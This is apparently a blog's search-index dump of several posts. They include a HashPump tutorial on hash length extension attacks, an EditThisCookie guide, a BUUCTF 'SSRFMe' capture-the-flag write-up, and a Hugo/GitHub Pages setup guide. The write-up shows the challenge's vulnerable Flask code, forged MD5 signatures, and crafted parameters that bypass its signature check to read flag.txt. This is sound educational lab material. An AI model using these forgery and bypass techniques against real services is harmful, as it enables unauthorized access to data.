clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev apt-get install gcc automake autoconf libtool make cd HashPump make make install   基本使用 举个例\n1 2 3 4 5 6 7  root@DESKTOP-71UIJUJ:/home/lurenxiao/webCTF/HashPump# hashpump  Input Signature: 6c11de60d6c16a5eafd11a043dab6469 Input Data: scan Input Key Length: 24 Input Data to Add: read 0b78be0ecb77afd83c52222232f4dea5 scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read   分别输入已知hash、数据、长度、以及追加数据可得\n$hash(key+data+padding0+m)$\n$data+padding0+m$\n也可以直接命令行\n1 2 3  lurenxiao@DESKTOP-71UIJUJ:~$ hashpump -s \u0026#39;6c11de60d6c16a5eafd11a043dab6469\u0026#39; --data \u0026#39;scan\u0026#39; -a \u0026#39;read\u0026#39; -k 24 0b78be0ecb77afd83c52222232f4dea5 scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read   所有参数 1 2 3 4 5 6 7 8 9 10  HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength] HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack. -h --help Display this message. -t --test Run tests to verify each algorithm is operating properly. -s --signature The signature from known message. -d --data The data from the known message. -a --additional The information you would like to add to the known message. -k --keylength The length in bytes of the key being used to sign the original message with. Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support. \u0026lt;Developed by bwall(@botnet_hunter)\u0026gt;   ","description":"由已有hash计算新hash值","id":16,"section":"posts","tags":["hashpump","web","webctf"],"title":"hashpump的使用","uri":"https://lurenxiao1998.github.io/zh/posts/hashpump%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"content":"EditThisCookie是一个可以设置和更改cookie的chrome插件。\n打开EditThisCookie可以看到界面\n添加cookie 按 + 可以添加网页cookie\nname项为cookie名，value项为cookie值。path为cookie在该域下的哪个path有效。\n例如，图中我设置了一个name=action，value=scan，只在/De1ta下生效的cookie。\n点击对勾使cookie生效。\n修改cookie 访问一个网页，比如刚才我们设置cookie的/De1ta页面，可以在此处修改刚设置的cookie值。\n点击垃圾桶标志可以删除这个cookie，点击红色禁止标志可以添加对cookie的filter。\n分别为，通过域名，cookie名，和value值来禁止cookie。\n","description":"添加和修改cookie值","id":17,"section":"posts","tags":["cookie","EditThisCookie","web","webctf"],"title":"EditThisCookie的简单使用","uri":"https://lurenxiao1998.github.io/zh/posts/editthiscookie%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"content":"解法一 哈希拓展攻击 secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取hashlib.md5(secert_key + param + action).hexdigest() ，密钥param不动，增加action的内容。\n  使用 hashpump\n  1 2 3 4 5 6 7 8 9  root@DESKTOP-71UIJUJ:/home/lurenxiao/webCTF/HashPump# hashpump  Input Signature: 6c11de60d6c16a5eafd11a043dab6469 Input Data: scan Input Key Length: 24 Input Data to Add: read 0b78be0ecb77afd83c52222232f4dea5 scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00 \\x00\\x00\\x00read     最下面一行为action（设置时把所有 \u0026lsquo;\\x\u0026rsquo; 改为 \u0026lsquo;%\u0026rsquo; 即可），倒数第二行为sign。设置cookie访问/geneSign?param=flag.txt\n    解法二 构造字符串 前言 过程比较繁琐，还包含了一些我的解题想法，想直接看答案可以跳到结果这一章去看。\n解题思路 BUUCTF SSRFMe，打开是一段python代码，手动格式化。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91  #! /usr/bin/env python  # #encoding=utf-8  from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr  os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) resp = scan(self.param) if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;) result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read() if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan.  @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;)) param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;)) ip = request.remote_addr if(waf(param)): return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;,\u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=80)   有三个uri\n /geneSign / /De1ta  flag保存在了**./flag.txt**\ngeneSign生成签名，challenge验证签名通过action执行操作，scan利用urllib.urlopen(param)获取数据保存到result.txt，read获取result.txt的内容显示。\n先访问geneSign获取签名。然后用editthiscookie设置网页cookie值，访问De1ta，通过scan保存文件，read读取内容。\n过程 这里我们先不设置cookie访问一遍看是什么效果\n应该是request.cookies.get的时候出错了，这个时候想action cookie没设，可以用editthiscookie设置cookie，但是要知道sign的值，task是通过checkSign验证签名，checkSign调用getSign。getSign里有个secert_key，secert_key是初始化的时候系统随机的os.urandom(16) ，所以查getSign还在哪调用。\ngetSign在/geneSign里也用了，所以我们可以先访问getSign获取sign。\n这个时候设置cookie（action=scan,sign=0e5aedec26dae45a34faa23d8fcd219b）访问看看\n看到action=scan要用scan这个函数，要求一个param参数\n1 2 3 4 5 6  def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \u0026#34;Connection Timeout\u0026#34;   这个param由/De1ta从url参数中获取，并且有一个waf函数，过滤所有以\u0026quot;gopher\u0026quot;和\u0026quot;file\u0026quot;开头的param。这个时候想到可以通过urllib.urlopen(param)来打开./flag.txt。\n查看python官方文档，看看有没有什么可以绕过的方法。\n注意这句话\n Open a network object denoted by a URL for reading. If the URL does not have a scheme identifier, or if it has file: as its scheme identifier, this opens a local file (without universal newlines); otherwise it opens a socket to a server somewhere on the network.\n 所以我们可以直接用param=flag.txt打开./flag.txt读取flag\n尝试 先试一下\n1  http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/geneSign?param=flag.txt   设置cookie\n访问\n1  http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/De1ta?param=flag.txt   这个时候flag肯定已经保存到\u0026quot;./%s/result.txt\u0026quot; % self.sandbox 这个文件里了\n我想通过action=\u0026ldquo;read\u0026quot;读，所以设置cookie中的action=read\n访问\n1  http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/De1ta?param=flag.txt   诶，怎么有点不对，继续看代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) resp = scan(self.param) if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;) result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read() if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()   发现我们通过geneSign获取sign时，geneSign设置action=\u0026ldquo;scan\u0026rdquo;。访问/De1ta时我们想获取flag只能action=\u0026ldquo;read\u0026rdquo;。这个时候我看到，当action=\u0026ldquo;read\u0026quot;时，param是未在主逻辑中使用，但是在checkSign的时候却需要用到，而geneSign的param就纯用来生成签名，这不是暗示我可以构造param来绕过这一波逻辑直达action=\u0026ldquo;read\u0026quot;吗？\n这个时候想构造的这个param，能让action=\u0026ldquo;scan\u0026quot;的时候生成的 sign 可以在访问/De1ta，action=\u0026ldquo;read\u0026quot;的时候通过验证。\n结果 1 2  def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()   action在param后边，我们注意在/De1ta里判断action使用的是 in 。\n设置 param=flag.txtread 就可以让生成的时候\nparam + action为flag.txtreadscan\n1  http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/geneSign?param=flag.txtread   设置 action=readscan、param=flag.txt\nparam + action也为flag.txtreadscan\n就可以通过scan设置result.txt为flag.txt的内容，read读取到flag.txt的内容。\n设置sign为刚才查到的sign。\n访问\n1  http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/De1ta?param=flag.txt   获得flag\n参考 De1CTF ssrf_me 的三种解法\nHash Length Extension Attack\n","description":"BUUCTF的一道WEB题","id":18,"section":"posts","tags":["BUUCTF","ctf","web","webctf","De1CTF","SSRFMe","SSRFMe"],"title":"BUUCTF SSRFMe","uri":"https://lurenxiao1998.github.io/zh/posts/ssrf-me/"},{"content":"环境  Arch Linux ( Manjaro Linux) Hugo 1 G 的剩余空间  搭建 1 2  pacman -Syy pacman -Syu hugo   前往hugo主题挑选一个你喜欢的主题，挑选好了之后进入它的homepage。这里我选择的是zzo主题，简洁的画风，近乎完善的功能，这就够了。\n进入你想放置网站项目的地方\n1 2 3  hugo new site [你的网站名] cd [你的网站名] git init   git clone [git clone https://github.com/zzossig/hugo-theme-zzo.git themes/zzo|你选择主题的git] themes/[zzo|你的主题名]\n接下来要按照你主题的homepage指引配置，有些主题的配置区别与官方配置，例如我这个zzo主题，要求吧网站root下的config.toml删掉，在theme/zzo/example下新建一个config文件夹。\n  一般配置，在 config.toml 里将 theme 改为 theme = \u0026ldquo;[主题名]\u0026rdquo; 即可把网站设置为你刚选择的主题（zzo改成你的主题名）\n1  gedit config.toml     zzo配置\n  在theme/zzo/exampleSite下新建一个config文件夹，目录结构如下所示，注意default前有一个下划线，如果目录结构不对会报找不到配置文件的错\n1 2 3 4 5 6 7  exampleSite ├── config │ ├── _default │ │ ├── config.toml │ │ ├── languages.toml │ │ ├── menus.en.toml │ │ ├── params.toml     config.toml\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  baseURL = \u0026#34;http://example.org/\u0026#34; title = \u0026#34;Hugo Zzo Theme\u0026#34; theme = \u0026#34;zzo\u0026#34; defaultContentLanguage = \u0026#34;en\u0026#34; defaultContentLanguageInSubdir = true hasCJKLanguage = true summaryLength = 70 copyright = \u0026#34;\u0026amp;copy;{year}, All Rights Reserved\u0026#34; timeout = 10000 enableEmoji = true paginate = 7 rssLimit = 100 [outputs] home = [ \u0026#34;HTML\u0026#34;, \u0026#34;RSS\u0026#34;, \u0026#34;JSON\u0026#34; ] [taxonomies] category = \u0026#34;categories\u0026#34; tag = \u0026#34;tags\u0026#34; series = \u0026#34;series\u0026#34;   languages.toml  1 2 3 4 5 6 7 8 9  [en] title = \u0026#34;Hugo Zzo Theme\u0026#34; languageName = \u0026#34;English\u0026#34; weight = 1 [ko] title = \u0026#34;Hugo Zzo Theme\u0026#34; languageName = \u0026#34;한국어\u0026#34; weight = 2    menus.en.toml\n此处你可以自定义自己的menus\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  [[main]] identifier = \u0026#34;about\u0026#34; name = \u0026#34;about\u0026#34; url = \u0026#34;about\u0026#34; weight = 1 [[main]] identifier = \u0026#34;archive\u0026#34; name = \u0026#34;archive\u0026#34; url = \u0026#34;archive\u0026#34; weight = 2 [[main]] identifier = \u0026#34;gallery\u0026#34; name = \u0026#34;gallery\u0026#34; url = \u0026#34;gallery\u0026#34; weight = 3 [[main]] parent = \u0026#34;gallery\u0026#34; name = \u0026#34;cartoon\u0026#34; url = \u0026#34;gallery/cartoon\u0026#34; [[main]] parent = \u0026#34;gallery\u0026#34; name = \u0026#34;photo\u0026#34; url = \u0026#34;gallery/photo\u0026#34; [[main]] identifier = \u0026#34;posts\u0026#34; name = \u0026#34;posts\u0026#34; url = \u0026#34;posts\u0026#34; weight = 4 [[main]] identifier = \u0026#34;notes\u0026#34; name = \u0026#34;notes\u0026#34; url = \u0026#34;notes\u0026#34; weight = 5   params.toml  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  logoText = \u0026#34;Zzo\u0026#34; description = \u0026#34;The Zzo theme for Hugo example site.\u0026#34; custom_css = [] custom_js = [] # header homeHeaderType = \u0026#34;img\u0026#34; # text, img, slide # body enableBreadcrumb = true enablePhotoSwipe = true enableSearch = true enableMark = true enableGoToTop = true enableWhoami = true summaryShape = \u0026#34;card\u0026#34; # card, classic, compact archiveGroupByDate = \u0026#34;2006\u0026#34; # \u0026#34;2006-01\u0026#34;: group by month, \u0026#34;2006\u0026#34;: group by year archivePaginate = 20 paginateWindow = 1 # whoami myname = \u0026#34;\u0026#34; email = \u0026#34;\u0026#34; whoami = \u0026#34;\u0026#34; useGravatar = false location = \u0026#34;\u0026#34; organization = \u0026#34;\u0026#34; link = \u0026#34;\u0026#34; # sidebar enableBio = true enableSidebar = true enableSidebarTags = true enableSidebarSeries = true enableSidebarCategories = true enableToc = true enableTocSwitch = true itemsPerCategory = 5 enableSideSubscribe = false searchLanguages = [\u0026#39;en\u0026#39;] # checkout lunr.js supported language # comment enableComment = false disqus_shortname = \u0026#34;\u0026#34; commento = false # footer showPoweredBy = true showFeedLinks = true showSocialLinks = true enableLangChange = true enableThemeChange = true themeOptions = [\u0026#34;dark\u0026#34;, \u0026#34;light\u0026#34;, \u0026#34;hacker\u0026#34;, \u0026#34;solarized\u0026#34;, \u0026#34;custom\u0026#34;] [socialOptions] email = \u0026#34;mailto:your@email.com\u0026#34; facebook = \u0026#34;http://example.org/\u0026#34; twitter = \u0026#34;http://example.org/\u0026#34; github = \u0026#34;http://example.org/\u0026#34; stack-overflow = \u0026#34;\u0026#34; instagram = \u0026#34;\u0026#34; google-plus = \u0026#34;\u0026#34; youtube = \u0026#34;\u0026#34; medium = \u0026#34;\u0026#34; tumblr = \u0026#34;\u0026#34; linkedin = \u0026#34;\u0026#34; pinterest = \u0026#34;\u0026#34; stack-exchange = \u0026#34;\u0026#34;     本地运行，进入themes/zzo/exampleSite目录\n1  hugo server --themesDir ../..   打开浏览器看一下刚才搭建的博客，成功～\n配置 复制exampleSite，改名为你的博客名，可以用cp拷贝到exampleSite同级目录下，也可以直接拷\n1  cp -r exampleSite lurenxiao   配置自己的页面 做这个主题的是个韩国人，接着我们要把这个韩文版去掉，增加一个中文版，以下是目录结构\n  params.zh.toml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  logoText = \u0026#34;\u0026#34; description = \u0026#34;路人枭的博客.\u0026#34; custom_css = [] custom_js = [] # header homeHeaderType = \u0026#34;img\u0026#34; # text, img, slide # body enableBreadcrumb = true enablePhotoSwipe = true enableSearch = true enableMark = true enableGoToTop = true enableWhoami = true summaryShape = \u0026#34;card\u0026#34; # card, classic, compact archiveGroupByDate = \u0026#34;2006\u0026#34; # \u0026#34;2006-01\u0026#34;: group by month, \u0026#34;2006\u0026#34;: group by year archivePaginate = 20 paginateWindow = 1 # whoami myname = \u0026#34;\u0026#34; email = \u0026#34;\u0026#34; whoami = \u0026#34;\u0026#34; useGravatar = false location = \u0026#34;\u0026#34; organization = \u0026#34;\u0026#34; link = \u0026#34;\u0026#34; # sidebar enableBio = true enableSidebar = true enableSidebarTags = true enableSidebarSeries = true enableSidebarCategories = true enableToc = true enableTocSwitch = true itemsPerCategory = 5 enableSideSubscribe = false searchLanguages = [\u0026#39;zh\u0026#39;] # checkout lunr.js supported language # comment enableComment = false disqus_shortname = \u0026#34;\u0026#34; commento = false # footer showPoweredBy = true showFeedLinks = true showSocialLinks = true enableLangChange = true enableThemeChange = true themeOptions = [\u0026#34;dark\u0026#34;, \u0026#34;light\u0026#34;, \u0026#34;hacker\u0026#34;, \u0026#34;solarized\u0026#34;, \u0026#34;custom\u0026#34;] [socialOptions] email = \u0026#34;mailto:your@email.com\u0026#34; facebook = \u0026#34;http://example.org/\u0026#34; twitter = \u0026#34;http://example.org/\u0026#34; github = \u0026#34;http://example.org/\u0026#34; stack-overflow = \u0026#34;\u0026#34; instagram = \u0026#34;\u0026#34; google-plus = \u0026#34;\u0026#34; youtube = \u0026#34;\u0026#34; medium = \u0026#34;\u0026#34; tumblr = \u0026#34;\u0026#34; linkedin = \u0026#34;\u0026#34; pinterest = \u0026#34;\u0026#34; stack-exchange = \u0026#34;\u0026#34;     menus.zh.toml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  [[main]] identifier = \u0026#34;about\u0026#34; name = \u0026#34;关于\u0026#34; url = \u0026#34;about\u0026#34; weight = 1 [[main]] identifier = \u0026#34;gallery\u0026#34; name = \u0026#34;画廊\u0026#34; url = \u0026#34;gallery\u0026#34; weight = 3 [[main]] parent = \u0026#34;gallery\u0026#34; name = \u0026#34;卡通\u0026#34; url = \u0026#34;gallery/cartoon\u0026#34; [[main]] parent = \u0026#34;gallery\u0026#34; name = \u0026#34;照片\u0026#34; url = \u0026#34;gallery/photo\u0026#34; [[main]] identifier = \u0026#34;posts\u0026#34; name = \u0026#34;文章\u0026#34; url = \u0026#34;posts\u0026#34; weight = 4 [[main]] identifier = \u0026#34;notes\u0026#34; name = \u0026#34;笔记\u0026#34; url = \u0026#34;notes\u0026#34; weight = 5     你可以试着自己把.zh里的一些英文字符串改成中文，看是否适配\n接着把content里的韩文后缀改成zh，以及把里边的韩文改成中文\n写一篇博客 hugo的文章都放在content里，所以我们在content/posts里新建一个md文件，firstBlog.zh.md\n1 2 3 4 5 6 7 8 9 10 11 12 13  --- title: \u0026#34;Hugo 1\u0026#34; date: 2017-10-11T10:33:41+09:00 description: \u0026#34;Hugo 1 Description\u0026#34; tags: - hugo series: - categories: - ---   title是你的标题名，description是贴在标题下的描述，tags是这篇博文的一些标签，你可以设置多个标签，多行- tag即可。series是系列，categories是类型，配置方法与tags一样。\n然后你可以在下边写一点东西，如下图所示\n保存，hugo会自动运行，用浏览器可以看到已经成功的写了你的第一篇博客\n使用GitPages发布网站 写博客肯定还是要分享的，我们接下来用gitpage发布我们的博客\n进入刚才运行网页的目录，即进入theme/zzo/[你的网站]\n1  hugo --themesDir ../../   可以看到目录下多了一个/public文件夹出来，这个文件夹就是Hugo生成的静态网页。我们最终要将这些静态网页部署到一个地方，免费且稳定的GitHub Pages是一个很好的选择。具体操作如下：\n 在GitHub新建一个Repository命名为lurenxiao1998.github.io，其中lurenxiao1998改成自己的GitHub账户名； 在/mysite外建立一个平行的文件夹，此处假设也命名为/lurenxiao1998.github.io； 进入/public文件夹将内容复制到/lurenxiao1998.github.io； 将/lurenxiao1998.github.io的内容push到远程仓库。  以上命令可在命令行通过以下语句实现：\n1 2 3 4 5 6  cd public git init git add . git commit -m \u0026#34;first blog\u0026#34; git remote add origin https://github.com/lurenxiao1998/lurenxiao1998.github.io.git git push -u origin master   完成以上命令后，等待一分钟左右即可在 https://lurenxiao1998.github.io/ 访问你的网站。\npush到远程仓库即可。也可将步骤写为Shell脚本，此处不再赘述。\n使用自己的域名访问博客【可选】 首先你得拥有你自己的域名，我之前申请过一个阿里云域名，我们直接从域名解析开始，如果还没有域名的话，先去域名管理商申请一个。这里不赘述。\n我们需要知道你的gitpage的ip，然后创建一个A记录和一个CNAME记录。\n首先ping你的网站，可以看到你网站的ip\n去阿里云首先得申请一个ssl证书，你才可以进行https访问，这个上网搜。\n然后构建一个A记录和一个CNAME记录，你的gitpage可能会有多个ip，你可以多搭几个A记录，这里我只搭了一个\n这里有个问题，如果只填写CNAME记录确实可以访问网站，但是无法通过https访问，好像是因为你先访问lurenxiao.com，这个证书上写的域名是lurenxiao.com，但最终你要访问的是gitpage，域名不是lurenxiao.com。所以要配一个A记录把域名直接绑定上ip，这个地方不是很懂。\n进行完如上操作之后先别去访问www.lurenxiao.com。还需要在你的gitpage上添加一个CNMAE。你可以自己添加到public然后PUSH上去，一行就是你的域名\n也可以在Settings里设置，github会自动帮你添加一个CNAME文件\n这里比较推荐自己添加push上去，因为下一次你push的时候也因为github比本地多个文件发生冲突。\n接下来你就可以通过域名访问你的博客了\n","description":"我的第一篇博客","id":19,"section":"posts","tags":["博客","hugo","gitpage","blog","manjaro","阿里云","zzo"],"title":"搭建个人博客","uri":"https://lurenxiao1998.github.io/zh/posts/firstblog/"},{"content":"Sample images from Pixabay\n","description":"cartoon gallery","id":20,"section":"gallery","tags":null,"title":"Cartoon","uri":"https://lurenxiao1998.github.io/zh/gallery/cartoon/"},{"content":"About me 希望能成为有用的人\nContact Personal\n Email：lurenxiao98@gmail.com 我的微信：luren_xiao（备注：博客）  Friends  sky chenshujie wxk  Note 有什么问题欢迎给我发邮件。  History  2019年，开始搭建博客。  ","description":"关于我","id":26,"section":"","tags":null,"title":"关于我","uri":"https://lurenxiao1998.github.io/zh/about/"}]